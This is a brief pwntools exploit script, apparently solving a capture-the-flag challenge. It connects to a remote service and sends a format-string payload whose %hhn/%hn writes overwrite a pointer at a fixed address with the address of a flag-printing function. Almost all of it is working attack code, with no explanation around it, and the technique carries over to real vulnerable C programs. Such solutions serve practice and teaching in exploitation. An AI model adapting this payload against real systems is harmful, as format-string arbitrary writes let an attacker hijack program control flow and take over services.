from pwn import *

r = remote('172.17.0.13', 14505)

# r.interactive()

r.recvuntil(b"> ")

GET_FLAG = 0x00401296 # 0x0040 = 64 ; 0x1296 = 4758 ; 4758 - 64 = 4694
ADDR = 0x00404098

payload = b"%64c%15$hhn%4694c%14$hn"
payload = payload.ljust(32, b"A") # 补齐至32字节
payload += p64(ADDR)
payload += p64(ADDR + 2)

r.sendline(payload)
print(r.recvall(timeout=3).decode(errors="replace"))

